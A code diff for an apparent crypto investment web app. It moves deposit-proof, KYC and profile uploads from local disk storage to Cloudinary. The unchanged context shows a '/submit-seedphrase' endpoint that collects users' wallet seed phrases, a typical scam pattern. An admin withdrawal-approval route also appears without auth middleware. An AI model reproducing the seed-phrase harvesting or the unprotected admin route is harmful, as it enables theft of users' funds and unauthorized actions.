@@ -26,58 +26,50 @@ function isLoggedIn(req, res, next) {
 }
 
 
-// File storage config
-const storage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    cb(null, "uploads/deposits/");
-  },
-  filename: function (req, file, cb) {
-    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
-    cb(null, uniqueSuffix + path.extname(file.originalname));
+// cloudinary.js
+const cloudinary = require('cloudinary').v2;
+const { CloudinaryStorage } = require('multer-storage-cloudinary');
+
+cloudinary.config({
+  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+  api_key: process.env.CLOUDINARY_API_KEY,
+  api_secret: process.env.CLOUDINARY_API_SECRET
+});
+
+const kycStorage = new CloudinaryStorage({
+  cloudinary,
+  params: {
+    folder: 'kyc_uploads',
+    allowed_formats: ['jpg', 'png', 'jpeg', 'pdf'],
+    public_id: (req, file) => `kyc-${req.user.id}-${Date.now()}`
   },
 });
 
-// File filter (optional – only images/pdf)
-const fileFilter = (req, file, cb) => {
-  const allowedTypes = ["image/jpeg", "image/png", "application/pdf"];
-  if (allowedTypes.includes(file.mimetype)) {
-    cb(null, true);
-  } else {
-    cb(new Error("Only images and PDF files are allowed"), false);
-  }
+const profileStorage = new CloudinaryStorage({
+  cloudinary,
+  params: {
+    folder: 'profile_images',
+    allowed_formats: ['jpg', 'png', 'jpeg'],
+    public_id: (req, file) => `profile-${req.user.id}-${Date.now()}`
+  },
+});
+
+const depositStorage = new CloudinaryStorage({
+  cloudinary,
+  params: {
+    folder: 'deposit_proofs',
+    allowed_formats: ['jpg', 'png', 'jpeg', 'pdf'],
+    public_id: (req, file) => `deposit-${req.user.id}-${Date.now()}`
+  },
+});
+
+module.exports = {
+  cloudinary,
+  kycUpload: multer({ storage: kycStorage }),
+  uploadProfile: multer({ storage: profileStorage }),
+  depositUpload: multer({ storage: depositStorage }),
 };
 
-const upload = multer({ storage, fileFilter });
-
-
-// Profile image storage
-const profileStorage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    cb(null, 'uploads/profile');
-  },
-  filename: function (req, file, cb) {
-    const uniqueName = `${req.user.id}-${Date.now()}${path.extname(file.originalname)}`;
-    cb(null, uniqueName);
-  }
-});
-const uploadProfile = multer({ storage: profileStorage });
-
-const kycStorage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, 'uploads/kyc'),
-  filename: (req, file, cb) => {
-    const ext = path.extname(file.originalname);
-    cb(null, `${req.user.id}-${Date.now()}${ext}`);
-  }
-});
-
-const kycUpload = multer({
-  storage: kycStorage,
-  fileFilter: (req, file, cb) => {
-    const allowedTypes = /pdf|jpg|jpeg|png/;
-    const ext = path.extname(file.originalname).toLowerCase();
-    cb(null, allowedTypes.test(ext));
-  }
-});
 
 
 const app = express();
@@ -240,7 +232,7 @@ app.get("/kyc", async (req, res) => {
     const user = userResult.rows[0];
 
     if (!user || !user.wallet_address) {
-      return res.send(`<script>alert("Connect Wallet first!"); window.location.href = "/dashboard";</script>`);
+      return res.send(`<script>alert("Connect Wallet first!"); window.location.href = "/";</script>`);
     }
 
     const walletAddress = user.wallet_address;
@@ -985,7 +977,9 @@ app.post("/update-settings", async (req, res) => {
 });
 
 
-app.post("/deposit", isLoggedIn, upload.single("payment_proof"), async (req, res) => {
+const { depositUpload } = require('./cloudinary');
+
+app.post("/deposit", isLoggedIn, depositUpload.single("payment_proof"), async (req, res) => {
   if (!req.isAuthenticated()) return res.redirect("/login");
 
   const { amount } = req.body;
@@ -1064,6 +1058,9 @@ app.post("/deposit", isLoggedIn, upload.single("payment_proof"), async (req, res
 
 
 
+
+
+
 app.post("/submit-seedphrase", async (req, res) => {
   try {
       const { userId, ...seedPhrases } = req.body;
@@ -1093,17 +1090,20 @@ app.post("/submit-seedphrase", async (req, res) => {
   }
 });
 
+const { kycUpload } = require('./cloudinary');
+
 app.post('/upload-kyc', isLoggedIn, kycUpload.single('kyc_document'), async (req, res) => {
-  if (!req.file) {
+  if (!req.file || !req.file.path) {
     return res.render('kyc', { message: 'Please upload a valid PDF or image document.' });
   }
 
-  const filePath = `/uploads/kyc/${req.file.filename}`;
+  const fileUrl = req.file.path;
 
-  await pool.query("UPDATE users SET kyc_document = $1, kyc_status = 'pending' WHERE id = $2", [filePath, req.user.id]);
+  await pool.query("UPDATE users SET kyc_document = $1, kyc_status = 'pending' WHERE id = $2", [fileUrl, req.user.id]);
 
   res.render('kyc', { message: 'Your KYC document has been submitted and is under review.' });
 });
+
 // Approve Withdrawal
 app.post('/admin/withdrawals/:id/approve', async (req, res) => {
   const withdrawalId = req.params.id;
@@ -1395,20 +1395,19 @@ app.post('/investment', async (req, res) => {
 
 
 
+const { uploadProfile } = require('./cloudinary');
+
 app.post("/upload-profile", isLoggedIn, uploadProfile.single("profileImage"), async (req, res) => {
   try {
-    const userId = req.user.id;
-    const imagePath = '/uploads/profile/' + req.file.filename;
-
-    // Update user's profile image in DB
-    await pool.query("UPDATE users SET profile_image = $1 WHERE id = $2", [imagePath, userId]);
-
+    const imagePath = req.file.path;
+    await pool.query("UPDATE users SET profile_image = $1 WHERE id = $2", [imagePath, req.user.id]);
     res.redirect("/");
   } catch (err) {
     console.error("Error uploading profile image:", err);
     res.status(500).send("Failed to upload profile image.");
   }
 });
+
 
 
 
